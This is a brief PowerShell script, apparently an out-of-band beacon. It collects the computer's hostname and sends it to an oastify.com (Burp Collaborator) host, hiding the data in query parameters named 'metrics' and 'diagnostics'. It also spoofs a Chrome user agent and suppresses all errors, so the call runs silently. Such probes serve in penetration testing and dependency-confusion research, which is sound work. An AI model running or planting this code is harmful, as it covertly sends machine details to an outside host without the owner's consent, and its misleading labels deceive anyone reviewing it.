$hostname = $env:COMPUTERNAME
$burpUrl = "http://0z0aqem1z2rjf7g26yrsi5k20t6kuaiz.oastify.com" 
$requestUri = "$burpUrl`?metrics=[$(Get-Date -Format 'HHmmss')]&diagnostics=$hostname"
$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
try {
    $response = Invoke-WebRequest -Uri $requestUri -UserAgent $userAgent `
        -TimeoutSec 3 -ErrorAction SilentlyContinue
}
catch {
    Out-Null
}